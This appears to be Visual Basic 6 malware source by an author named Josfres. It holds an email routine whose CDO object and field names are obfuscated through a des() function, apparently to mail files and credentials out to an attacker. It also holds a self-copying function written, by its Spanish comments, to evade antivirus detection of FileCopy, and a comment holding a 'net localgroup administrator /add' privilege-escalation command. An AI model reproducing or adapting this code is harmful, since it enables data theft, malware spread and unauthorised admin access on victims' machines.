Attribute VB_Name = "Module1"
Public Function Email_XT(mFromEmail As String, mFromPassword As String, mSMTPServer As String, mPort As Integer, mToEmail As String, mSubject As String, mBody As String, mAttachment As String)
Dim iMsg As Object
Dim iConf As Object

Dim Flds As Variant

Set iMsg = CreateObject(des("OP[:Yqmsq"))
Set iConf = CreateObject(des("OP[:O{zrus~m€u{z"))

iConf.Load -1 ' CDO Source Defaults
Set Flds = iConf.Fields
With Flds
.Item(des("t€€|F;;otqym:yuo~{{r€:o{y;op{;o{zrus~m€u{z;y€|qx")) = True
.Item(des("t€€|F;;otqym:yuo~{{r€:o{y;op{;o{zrus~m€u{z;y€|m€tqz€uom€q")) = 1
.Item(des("t€€|F;;otqym:yuo~{{r€:o{y;op{;o{zrus~m€u{z;qzpq~zmyq")) = mFromEmail
.Item(des("t€€|F;;otqym:yuo~{{r€:o{y;op{;o{zrus~m€u{z;qzp|mƒ{~p")) = mFromPassword
.Item(des("t€€|F;;otqym:yuo~{{r€:o{y;op{;o{zrus~m€u{z;y€|q~‚q~")) = mSMTPServer
.Item(des("t€€|F;;otqym:yuo~{{r€:o{y;op{;o{zrus~m€u{z;qzpuzs")) = 2
.Item(des("t€€|F;;otqym:yuo~{{r€:o{y;op{;o{zrus~m€u{z;y€|q~‚q~|{~€")) = mPort
.Update
End With

strbody = mBody

With iMsg
Set .Configuration = iConf
.To = mToEmail
.CC = ""
.BCC = ""

.From = "<sender@gmail.com>"
.Subject = mSubject
.TextBody = strbody
.AddAttachment mAttachment
.Send
End With

End Function

'net localgroup administrator ( EL MISMO USERNAME ) /add'
'Base:Visual Basic 6'
'Creador:Josfres'
'Fecha de creacion:Domingo 17 de Enero del 2009'
'Funcion:Otra manera de copiar un archivo,ya que la mayoria'
'de los AV detectan la funcion Filecopy de Vb'
'Uso y Distribuicion:Se permite la distribuicion siempre y
'cuando se respete el nombre del Autor'

Public Function jcopy2(ByVal ruta As String) 'creamos la funcion'
On Error Resume Next
Dim datos As String 'marcamos datos como una variable'
Dim yo As String 'marcamos yo como una variable'
yo = App.Path & "\" & App.EXEName & des(":q„q") 'definimos la variable YO con nuestra ruta'
Open yo For Binary As #1  'nos autoleemos'
datos = Space(LOF(1))  'definimos datos con todo el espacio'
Get #1, , datos 'obtemos nuestro exe'
Close #1 'nos cerramos'
If Len(Dir(ruta)) Then 'si exite el archivo no hacemos nada
Else 'si no existe lo creamos'
Open ruta For Binary As #1 'abrimos la ruta en binario'
Put #1, , datos 'metemos los datos'
Close #1 'cerramos los datos'
End If
End Function

